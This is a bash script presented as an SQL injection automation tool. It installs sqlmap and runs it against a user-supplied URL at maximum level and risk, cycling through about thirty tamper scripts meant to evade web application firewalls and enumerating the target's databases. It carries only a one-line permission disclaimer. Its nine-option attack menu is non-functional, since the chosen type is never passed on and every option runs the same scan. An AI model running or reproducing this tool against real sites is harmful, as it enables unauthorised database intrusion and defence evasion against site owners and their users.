#!/bin/bash

# Function to display a colorful banner
display_banner () {
    echo ""
    echo "############################################################"
    echo "#                                                          #"
    echo "#   ███████╗ ███████╗ ██╗     ██╗██╗                       #"
    echo "#   ██╔════╝ ██╔════╝ ██║     ██║██║                       #"
    echo "#   █████╗   █████╗   ██║     ██║██║                       #"
    echo "#   ██╔══╝   ██╔══╝   ██║     ██║██║                       #"
    echo "#   ██║      ███████╗ ███████╗██║███████╗                  #"
    echo "#   ╚═╝      ╚══════╝ ╚══════╝╚═╝╚══════╝                  #"
    echo "#                                                          #"
    echo "#   SQL Injection Automation Tool                         #"
    echo "#   Developed by: @fancybearIN                            #"
    echo "#                                                          #"
    echo "############################################################"
    echo ""
    echo "WARNING!!!"
    echo "Nobody takes responsibility for your actions. Always seek permission."
    echo ""
}

# Array of tamper scripts
tampers=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode' 'concat2concatws' 'equaltolike' 'greatest' 'halfversionedmorekeywords' 'ifnull2ifisnull' 'modsecurityversioned' 'modsecurityzeroversioned' 'multiplespaces' 'nonrecursivereplacement' 'percentage' 'randomcase' 'randomcomments' 'securesphere' 'space2comment' 'space2dash' 'space2hash' 'space2morehash' 'space2mssqlblank' 'space2mysqldash' 'space2plus' 'space2randomblank' 'unionalltounion' 'unmagicquotes')

# Function to perform SQL injection attacks
perform_attack () {
    attack_type=$1
    options=$2
    url_or_file=$3
    dbms=$4

    index=0

    # Determine if the input is a single URL or a file
    if [[ -f "$url_or_file" ]]; then
        target_option="-m $url_or_file"
    else
        target_option="-u $url_or_file"
    fi

    # While loop to iterate through tamper scripts
    while [ $index -lt ${#tampers[@]} ]; do
        tamper=${tampers[$index]}
        echo "##################################"
        echo "$tamper"
        echo "##################################"
        sqlmap $target_option --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch $options --tamper="$tamper" --alert="Vulnerability Found"
        
        # Increment the counter
        index=$((index + 1))
    done
}

# Function to install required tools
install_tools () {
    local tool="sqlmap"
    local distro=$(grep '^ID=' /etc/os-release | awk -F= '{print $2}')

    if ! command -v $tool &> /dev/null; then
        echo "$tool is not installed."
        if [[ "$distro" == "arch" || "$distro" == "manjaro" ]]; then
            sudo pacman -Sy --noconfirm
            sudo pacman -S --noconfirm sqlmap figlet toilet
        elif [[ "$distro" == "debian" || "$distro" == "ubuntu" ]]; then
            sudo apt update -y && sudo apt install -y sqlmap figlet toilet
        else
            echo "Unsupported distribution. Please install sqlmap, figlet, and toilet manually."
            exit 1
        fi
    else
        echo "$tool is already installed."
    fi
}

# Function to display the menu and handle user input
display_menu () {
    echo "Select an attack type:"
    echo "1) Injection-based"
    echo "2) File-based"
    echo "3) Blind-based"
    echo "4) Brute-based"
    echo "5) Time-based"
    echo "6) Error-based"
    echo "7) Out-of-band"
    echo "8) Full Attack"
    echo "9) Database Detection"
    echo ""

    read -p "Enter your choice (1-9): " choice

    case $choice in
        1) attack_type="injection-based" ;;
        2) attack_type="file-based" ;;
        3) attack_type="blind-based" ;;
        4) attack_type="brute-based" ;;
        5) attack_type="time-based" ;;
        6) attack_type="error-based" ;;
        7) attack_type="out-of-band" ;;
        8) attack_type="full" ;;
        9) attack_type="database-detection" ;;
        *) echo "Invalid choice. Exiting."; exit 1 ;;
    esac
}

# Main script execution
main () {
    # Display the banner
    display_banner

    # Install dependencies
    install_tools

    # Prompt for URL or file
    read -p "Enter the URL or file path: " url_or_file

    # Prompt for DBMS
    read -p "Enter the DBMS (default: mysql): " dbms
    dbms=${dbms:-mysql}

    # Display the menu
    display_menu

    # Perform the selected attack
    perform_attack "$attack_type" "--dbs" "$url_or_file" "$dbms"
}

# Run the main function
main "$@"